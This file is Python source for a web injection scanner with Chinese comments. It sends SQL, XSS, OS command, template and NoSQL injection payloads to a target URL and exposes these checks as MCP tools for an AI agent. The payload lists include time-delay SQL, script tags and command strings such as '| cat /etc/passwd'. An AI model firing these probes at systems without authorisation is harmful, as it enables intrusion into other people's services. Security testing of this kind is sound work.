#!/usr/bin/env python3
"""
漏洞检测工具 - 注入类漏洞检测
包含: SQL注入、XSS、命令注入、SSTI、NoSQL注入
"""
import logging
import time
import re
import json
from urllib.parse import urlparse, quote
from typing import TYPE_CHECKING

from .._common import GLOBAL_CONFIG, HAS_REQUESTS, get_verify_ssl

if HAS_REQUESTS:
    import requests

if TYPE_CHECKING:
    pass  # 用于类型检查的导入

logger = logging.getLogger(__name__)


# ============ SQL注入检测 ============

# 数据库错误特征
SQL_ERROR_PATTERNS = [
    # MySQL
    r"sql syntax.*mysql", r"warning.*mysql_", r"mysqlclient", r"mysqli",
    r"valid mysql result", r"mysql_fetch", r"mysql_num_rows",
    # PostgreSQL
    r"postgresql.*error", r"pg_query", r"pg_exec", r"pgsql",
    r"unterminated quoted string", r"invalid input syntax for",
    # Oracle
    r"ora-\d{5}", r"oracle.*driver", r"oracle.*error",
    r"quoted string not properly terminated", r"sql command not properly ended",
    # SQL Server
    r"microsoft.*sql.*server", r"sqlserver", r"odbc.*driver",
    r"unclosed quotation mark", r"incorrect syntax near",
    r"sql server.*error", r"mssql", r"sqlsrv",
    # SQLite
    r"sqlite.*error", r"sqlite3\.operationalerror", r"sqlite_",
    r"unrecognized token", r"unable to open database",
    # 通用
    r"syntax error", r"sql syntax", r"query failed",
    r"you have an error in your sql", r"supplied argument is not a valid",
    r"division by zero", r"invalid column name", r"unknown column",
    r"column.*not found", r"table.*doesn't exist", r"no such table",
]

# SQL注入Payload
SQL_ERROR_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", 
    "1' AND '1'='1", "1 AND 1=1", "' UNION SELECT NULL--",
    "1'1", "1 AND 1=1--", "' OR ''='", "') OR ('1'='1",
    "1' ORDER BY 1--", "1' ORDER BY 100--",
]

SQL_TIME_PAYLOADS = [
    ("' AND SLEEP(5)--", 5),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("' AND pg_sleep(5)--", 5),
    ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),
    ("' AND BENCHMARK(5000000,SHA1('test'))--", 5),
]

SQL_BOOL_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
]


def sqli_detect(url: str, param: str = None, deep_scan: bool = True) -> dict:
    """SQL注入检测 - 支持错误型、时间盲注、布尔盲注"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    base_url = url
    test_params = [param] if param else ["id", "page", "cat", "search", "q", "query", "user", "name", "item", "product"]

    # 获取基线响应
    baseline_lengths = []
    for _ in range(3):
        try:
            baseline_resp = requests.get(base_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
            baseline_lengths.append(len(baseline_resp.text))
        except Exception:
            logger.warning("Suppressed exception", exc_info=True)

    baseline_length = sum(baseline_lengths) / len(baseline_lengths) if baseline_lengths else 0

    for p in test_params:
        # 错误型注入检测
        for payload in SQL_ERROR_PAYLOADS:
            try:
                test_url = f"{base_url}{'&' if '?' in base_url else '?'}{p}={payload}"
                resp = requests.get(test_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                resp_lower = resp.text.lower()

                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, resp_lower, re.IGNORECASE):
                        vulns.append({
                            "type": "Error-based SQLi",
                            "severity": "CRITICAL",
                            "param": p,
                            "payload": payload,
                            "evidence": pattern,
                            "url": test_url
                        })
                        break
            except Exception:
                logger.warning("Suppressed exception", exc_info=True)

        if not deep_scan:
            continue

        # 时间盲注检测
        for payload, delay in SQL_TIME_PAYLOADS:
            try:
                test_url = f"{base_url}{'&' if '?' in base_url else '?'}{p}={payload}"

                # 基线测量
                baseline_times = []
                for _ in range(3):
                    try:
                        base_start = time.time()
                        requests.get(base_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                        baseline_times.append(time.time() - base_start)
                    except Exception:
                        logger.warning("Suppressed exception", exc_info=True)

                if len(baseline_times) < 2:
                    continue

                baseline_times.sort()
                base_elapsed = baseline_times[len(baseline_times) // 2]
                baseline_avg = sum(baseline_times) / len(baseline_times)
                baseline_variance = sum((t - baseline_avg) ** 2 for t in baseline_times) / len(baseline_times)
                baseline_std = baseline_variance ** 0.5
                jitter_tolerance = max(baseline_std * 2, 0.5)

                start = time.time()
                requests.get(test_url, timeout=delay + 10, verify=get_verify_ssl())
                first_elapsed = time.time() - start

                min_expected = base_elapsed + delay - jitter_tolerance
                if first_elapsed >= min_expected and first_elapsed >= delay * 0.90:
                    # 验证
                    verify_times = []
                    for _ in range(2):
                        try:
                            start_v = time.time()
                            requests.get(test_url, timeout=delay + 10, verify=get_verify_ssl())
                            verify_times.append(time.time() - start_v)
                        except Exception:
                            logger.warning("Suppressed exception", exc_info=True)

                    if len(verify_times) >= 2:
                        valid_delays = sum(1 for t in verify_times if t >= delay * 0.85)
                        if valid_delays >= 2:
                            avg_delay = sum(verify_times) / len(verify_times)
                            confidence = min(100, int((avg_delay / delay) * 80))
                            vulns.append({
                                "type": "Time-based Blind SQLi",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload,
                                "evidence": f"响应延迟 {first_elapsed:.2f}s (预期 {delay}s)",
                                "url": test_url,
                                "verified": True,
                                "confidence": confidence,
                            })
                            break
            except Exception:
                logger.warning("Suppressed exception", exc_info=True)

        # 布尔盲注检测
        for true_payload, false_payload in SQL_BOOL_PAYLOADS:
            try:
                true_url = f"{base_url}{'&' if '?' in base_url else '?'}{p}={true_payload}"
                false_url = f"{base_url}{'&' if '?' in base_url else '?'}{p}={false_payload}"

                true_resp = requests.get(true_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                false_resp = requests.get(false_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())

                len_diff = abs(len(true_resp.text) - len(false_resp.text))
                true_len = len(true_resp.text)
                
                len_diff_significant = len_diff > max(baseline_length * 0.1, 50)
                true_vs_baseline = abs(true_len - baseline_length)
                true_matches_baseline = true_vs_baseline < baseline_length * 0.15 if baseline_length > 0 else True
                status_diff = true_resp.status_code != false_resp.status_code
                
                if (len_diff_significant and true_matches_baseline) or status_diff:
                    verify_true = requests.get(true_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                    verify_false = requests.get(false_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                    verify_diff = abs(len(verify_true.text) - len(verify_false.text))
                    
                    if verify_diff > 30:
                        vulns.append({
                            "type": "Boolean-based Blind SQLi",
                            "severity": "HIGH",
                            "param": p,
                            "payload": f"TRUE: {true_payload} | FALSE: {false_payload}",
                            "evidence": f"响应长度差异: {len_diff}/{verify_diff} bytes",
                            "url": true_url,
                            "verified": True
                        })
                        break
            except Exception:
                logger.warning("Suppressed exception", exc_info=True)

    return {"success": True, "url": url, "sqli_vulns": vulns, "total": len(vulns), "deep_scan": deep_scan}


# ============ XSS检测 ============

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "javascript:alert(1)",
    "<body onload=alert(1)>"
]


def xss_detect(url: str, param: str = None) -> dict:
    """XSS检测 - 反射型XSS自动检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    base_url = url
    test_params = [param] if param else ["search", "q", "query", "keyword", "name", "input", "text", "msg"]

    for p in test_params:
        for payload in XSS_PAYLOADS:
            try:
                test_url = f"{base_url}{'&' if '?' in base_url else '?'}{p}={quote(payload)}"
                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                if payload in resp.text or payload.replace('"', '&quot;') in resp.text:
                    vulns.append({
                        "type": "Reflected XSS",
                        "severity": "HIGH",
                        "param": p,
                        "payload": payload,
                        "url": test_url
                    })
                    break
            except Exception:
                logger.warning("Suppressed exception", exc_info=True)

    return {"success": True, "url": url, "xss_vulns": vulns, "total": len(vulns)}


# ============ 命令注入检测 ============

CMD_PAYLOADS = [
    "; id", "| id", "|| id", "&& id", "& id",
    "; whoami", "| whoami", "|| whoami",
    "`id`", "$(id)", "${id}",
    "; sleep 5", "| sleep 5", "& timeout 5",
    "| cat /etc/passwd", "; type C:\\Windows\\win.ini"
]

CMD_INDICATORS = [
    "uid=", "gid=", "groups=",
    "root:", "daemon:", "bin:",
    "extensions", "for 16-bit app support"
]


def cmd_inject_detect(url: str, param: str = None) -> dict:
    """命令注入检测 - 检测OS命令注入漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    test_params = [param] if param else ["cmd", "exec", "command", "ping", "query", "host", "ip", "file", "path", "dir"]

    for p in test_params:
        for payload in CMD_PAYLOADS:
            try:
                test_url = f"{url}{'&' if '?' in url else '?'}{p}={quote(payload)}"
                resp = requests.get(test_url, timeout=15, verify=get_verify_ssl())

                for indicator in CMD_INDICATORS:
                    if indicator in resp.text:
                        vulns.append({
                            "type": "Command Injection",
                            "severity": "CRITICAL",
                            "param": p,
                            "payload": payload,
                            "evidence": indicator,
                            "url": test_url
                        })
                        break
            except Exception:
                logger.warning("Suppressed exception", exc_info=True)

    return {"success": True, "url": url, "cmd_vulns": vulns, "total": len(vulns)}


# ============ SSTI检测 ============

SSTI_PAYLOADS = {
    "jinja2": [("{{7*7}}", "49"), ("{{config}}", "Config")],
    "twig": [("{{7*7}}", "49"), ("{{_self.env}}", "Environment")],
    "freemarker": [("${7*7}", "49"), ("${.version}", "version")],
    "velocity": [("#set($x=7*7)$x", "49")],
    "smarty": [("{$smarty.version}", "Smarty"), ("{7*7}", "49")],
    "mako": [("${7*7}", "49")],
    "erb": [("<%=7*7%>", "49")],
    "thymeleaf": [("[[${7*7}]]", "49")],
}


def ssti_detect(url: str, param: str = None) -> dict:
    """SSTI模板注入检测"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    params = []
    if param:
        params = [param]
    elif parsed.query:
        params = [p.split('=')[0] for p in parsed.query.split('&') if '=' in p]
    if not params:
        params = ["q", "search", "query", "name", "input", "template", "page", "view"]

    for p in params[:5]:
        for engine, tests in SSTI_PAYLOADS.items():
            for payload, expected in tests:
                try:
                    test_url = f"{base_url}?{p}={quote(payload)}"
                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                    if expected in resp.text:
                        findings.append({
                            "type": "SSTI",
                            "engine": engine,
                            "param": p,
                            "payload": payload,
                            "severity": "CRITICAL",
                            "detail": f"检测到{engine}模板注入"
                        })
                        break
                except Exception:
                    logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "vulnerable": len(findings) > 0,
        "ssti_vulns": findings,
        "recommendations": ["避免将用户输入直接传入模板引擎", "使用沙箱模式渲染模板"] if findings else []
    }


# ============ NoSQL注入检测 ============

MONGODB_STR_PAYLOADS = [
    "' || '1'=='1", '{"$gt": ""}', '[$ne]=1', '[$gt]=',
    '[$regex]=.*', 'true, $where: "1 == 1"', '"; return true; var dummy="',
]

MONGODB_ERRORS = [
    "MongoError", "mongo", "MongoDB", "BSON", "ObjectId",
    "cannot be cast to", "query selector", "invalid operator",
    "$where", "mapreduce", "aggregate"
]


def nosql_detect(url: str, param: str = None, db_type: str = "auto") -> dict:
    """NoSQL注入检测 - 支持MongoDB/Redis/Elasticsearch"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}
    
    vulns = []
    base_url = url
    test_params = [param] if param else ["id", "user", "username", "search", "q", "query", "filter", "data", "json"]
    
    for p in test_params:
        if db_type in ["auto", "mongodb"]:
            for payload in MONGODB_STR_PAYLOADS:
                try:
                    test_url = f"{base_url}{'&' if '?' in base_url else '?'}{p}={quote(str(payload))}"
                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                    resp_lower = resp.text.lower()
                    
                    for error in MONGODB_ERRORS:
                        if error.lower() in resp_lower:
                            vulns.append({
                                "type": "MongoDB Injection",
                                "severity": "HIGH",
                                "param": p,
                                "payload": str(payload),
                                "evidence": error,
                                "url": test_url
                            })
                            break
                except Exception:
                    logger.warning("Suppressed exception", exc_info=True)

            # JSON Body注入
            try:
                headers = {"Content-Type": "application/json"}
                json_payloads = [
                    {"$gt": ""}, {"$ne": ""}, {"$regex": ".*"},
                ]
                for payload in json_payloads:
                    data = json.dumps({p: payload})
                    resp = requests.post(base_url, data=data, headers=headers, timeout=10, verify=get_verify_ssl())
                    resp_lower = resp.text.lower()
                    
                    for error in MONGODB_ERRORS:
                        if error.lower() in resp_lower:
                            vulns.append({
                                "type": "MongoDB JSON Injection",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": str(payload),
                                "evidence": error,
                                "method": "POST"
                            })
                            break
            except Exception:
                logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "db_type": db_type,
        "nosql_vulns": vulns,
        "total": len(vulns),
        "recommendations": [
            "使用参数化查询或ORM",
            "对用户输入进行严格验证",
            "实施最小权限原则"
        ] if vulns else []
    }


# ============ MCP工具注册 ============

def register_injection_tools(mcp) -> None:
    """注册注入类检测工具到MCP服务器"""
    
    @mcp.tool()
    def sqli_detect_tool(url: str, param: str = None, deep_scan: bool = True) -> dict:
        """SQL注入检测 - 支持错误型、时间盲注、布尔盲注"""
        return sqli_detect(url, param, deep_scan)
    
    @mcp.tool()
    def xss_detect_tool(url: str, param: str = None) -> dict:
        """XSS检测 - 反射型XSS自动检测"""
        return xss_detect(url, param)
    
    @mcp.tool()
    def cmd_inject_detect_tool(url: str, param: str = None) -> dict:
        """命令注入检测 - 检测OS命令注入漏洞"""
        return cmd_inject_detect(url, param)
    
    @mcp.tool()
    def ssti_detect_tool(url: str, param: str = None) -> dict:
        """SSTI模板注入检测"""
        return ssti_detect(url, param)
    
    @mcp.tool()
    def nosql_detect_tool(url: str, param: str = None, db_type: str = "auto") -> dict:
        """NoSQL注入检测 - 支持MongoDB/Redis/Elasticsearch"""
        return nosql_detect(url, param, db_type)
    
    logger.info("已注册注入类漏洞检测工具: sqli, xss, cmd_inject, ssti, nosql")


__all__ = [
    "sqli_detect",
    "xss_detect",
    "cmd_inject_detect",
    "ssti_detect",
    "nosql_detect",
    "register_injection_tools",
]